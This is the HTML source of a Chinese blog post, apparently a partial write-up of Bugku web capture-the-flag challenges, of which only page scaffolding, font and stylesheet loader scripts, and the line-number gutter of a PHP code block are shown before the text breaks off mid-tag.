<!DOCTYPE html>
<html lang="zh-Hans">
    <!-- title -->




<!-- keywords -->




<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="wywwzjj">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="wywwzjj">
    
    <meta name="keywords" content="wywwzjj,wywwzjj-ctf,wywwzjj-blog">
    
    <meta name="description" content>
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Bugku Web 部分WP · wywwzjj&#39;s Blog</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href="/assets/B.ico">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js" as="script">
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/">wywwzjj&#39;s Blog.</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">Bugku Web 部分WP</a>
            </div>
    </div>
    
    <a class="home-link" href="/">wywwzjj's Blog.</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="







height:50vh;
">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            Bugku Web 部分WP
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class="post-intro-tags">
    
        <a class="post-tag" href="javascript:void(0);" data-tags="Writeup">Writeup</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>字数统计: <span class="post-count word-count">8k</span>阅读时长: <span class="post-count reading-time">40 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2018/09/26</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span 